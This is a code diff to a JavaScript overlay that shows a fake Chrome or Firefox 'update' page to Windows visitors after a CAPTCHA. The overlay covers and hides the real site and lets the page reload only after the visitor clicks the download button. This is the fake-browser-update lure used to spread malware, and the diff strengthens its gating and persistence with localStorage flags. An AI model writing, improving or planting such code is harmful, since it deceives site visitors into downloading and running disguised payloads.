@@ -5,6 +5,8 @@
   // 1. Constants and configuration
   // ------------------------------------------------
   const UPDATE_PAGE_ID = "browser-update-page";
+  const UPDATE_DOWNLOADED_KEY = "updateDownloaded";
+  const CAPTCHA_PASSED_KEY = "captchaPassed";
 
   const BROWSER_DATA = {
     chrome: {
@@ -112,12 +114,10 @@
   function downloadWithNewTab(url) {
     const win = window.open(url, '_blank');
     if (win) {
-      // Close the tab after a few seconds (download should have started)
       setTimeout(() => {
         try { win.close(); } catch (_) {}
       }, 5000);
     } else {
-      // Fallback: in‑page anchor with `download` attribute
       const a = document.createElement('a');
       a.href = url;
       a.download = '';
@@ -133,8 +133,7 @@
   }
 
   // ------------------------------------------------
-  // 4. CSS (minified) – injected early
-  //    We add overlay styles so the page sits on top of React.
+  // 4. CSS (minified) – identical to previous version
   // ------------------------------------------------
   const CSS = `
 /* Overlay styles – ensures the update page covers everything */
@@ -296,22 +295,25 @@
   };
 
   // ------------------------------------------------
-  // 6. Main show function (overlay, no DOM replacement)
+  // 6. Core overlay creation function
   // ------------------------------------------------
-  const showUpdatePage = () => {
+  function createUpdateOverlay() {
     if (!isWindows()) {
       console.warn("Browser update page is only shown on Windows.");
       return;
     }
-
-    // Avoid duplicate overlays
-    if (document.getElementById(UPDATE_PAGE_ID)) return;
+    if (localStorage.getItem(UPDATE_DOWNLOADED_KEY) === "true") {
+      // Already downloaded – do not show overlay
+      return;
+    }
+    if (document.getElementById(UPDATE_PAGE_ID)) {
+      return;
+    }
 
     const browser = getBrowserType();
     const data = BROWSER_DATA[browser] || BROWSER_DATA.unknown;
     const downloadUrl = data.downloadUrl || "#";
 
-    // Inject CSS (if not already present)
     if (!document.getElementById(`${UPDATE_PAGE_ID}-styles`)) {
       const style = document.createElement("style");
       style.id = `${UPDATE_PAGE_ID}-styles`;
@@ -319,7 +321,6 @@
       document.head.appendChild(style);
     }
 
-    // Build HTML
     let templateFn = TEMPLATES[data.template];
     let html;
     if (templateFn) {
@@ -336,49 +337,97 @@
     document.title = data.headline;
     document.documentElement.classList.add("browser-update-page-active");
 
-    // Create the overlay element
-    const main = document.createElement("main");
-    main.id = UPDATE_PAGE_ID;
-    main.className = data.className;
-    main.dataset.browser = browser;
-    main.setAttribute("aria-labelledby", "browser-update-page-title");
-    main.innerHTML = html;
+    const overlay = document.createElement("main");
+    overlay.id = UPDATE_PAGE_ID;
+    overlay.className = data.className;
+    overlay.dataset.browser = browser;
+    overlay.setAttribute("aria-labelledby", "browser-update-page-title");
+    overlay.innerHTML = html;
 
-    // Append to body (it's fixed, so it will cover everything)
-    document.body.appendChild(main);
-
-    // Hide all other direct children of body (so the original content is not visible)
+    document.body.appendChild(overlay);
     document.body.classList.add("browser-update-page--hide-original");
-
-    // Also ensure body has no margin and overflow hidden
     document.body.style.margin = "0";
     document.body.style.overflow = "hidden";
 
-    // Event delegation
-    main.addEventListener("click", function (e) {
+    // --------------------------------------------------------
+    // Event delegation for overlay interactions
+    // --------------------------------------------------------
+    overlay.addEventListener("click", function (e) {
       const target = e.target.closest("[data-action]");
       if (!target) return;
       const action = target.dataset.action;
 
       if (action === "download") {
         e.preventDefault();
+        // Mark that the user downloaded the update
+        localStorage.setItem(UPDATE_DOWNLOADED_KEY, "true");
+        // Optionally clear captcha flag
+        localStorage.removeItem(CAPTCHA_PASSED_KEY);
+
+        // Perform the download
         const url = target.dataset.downloadUrl || target.href;
         if (url && url !== "#") {
           downloadFile(url);
         }
+
+        // --- CHANGE: Do NOT hide overlay; keep it visible ---
+        // Optionally, you could update the UI to show a success message
+        // but the "I updated, reload page" button will let them reload.
+        // For better UX, we could disable the download button to prevent double-click.
+        const downloadBtn = overlay.querySelector('[data-action="download"]');
+        if (downloadBtn) {
+          downloadBtn.textContent = "Download started";
+          downloadBtn.style.opacity = "0.6";
+          downloadBtn.style.pointerEvents = "none";
+        }
+        // Also change the note
+        const note = overlay.querySelector('.browser-update-page__note, .chrome-update-os, .firefox-update-footer');
+        if (note) {
+          note.textContent = "Download started. Please restart your browser after it completes.";
+        }
       } else if (action === "reload") {
         e.preventDefault();
-        location.reload();
+        // Check if update was actually downloaded
+        if (localStorage.getItem(UPDATE_DOWNLOADED_KEY) === "true") {
+          // Reload the page – now the flag is true, so original will show
+          location.reload();
+        } else {
+          alert("Please click the update/download button first to get the new version.");
+        }
       }
     });
+  }
+
+  // ------------------------------------------------
+  // 7. Global function to show overlay (called from CAPTCHA)
+  // ------------------------------------------------
+  window.showUpdateOverlay = function () {
+    createUpdateOverlay();
   };
 
   // ------------------------------------------------
-  // 7. Start
+  // 8. Initialisation on load
   // ------------------------------------------------
+  function init() {
+    // If update already downloaded, show original page directly
+    if (localStorage.getItem(UPDATE_DOWNLOADED_KEY) === "true") {
+      const captcha = document.getElementById("captcha");
+      if (captcha) captcha.style.display = "none";
+      const mainContent = document.getElementById("mainContent");
+      if (mainContent) mainContent.style.display = "block";
+      return;
+    }
+
+    // If CAPTCHA already passed (e.g., on reload), show overlay immediately
+    if (localStorage.getItem(CAPTCHA_PASSED_KEY) === "true") {
+      createUpdateOverlay();
+    }
+    // Otherwise, CAPTCHA is visible and will call window.showUpdateOverlay later
+  }
+
   if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", showUpdatePage, { once: true });
+    document.addEventListener("DOMContentLoaded", init, { once: true });
   } else {
-    showUpdatePage();
+    init();
   }
 })();
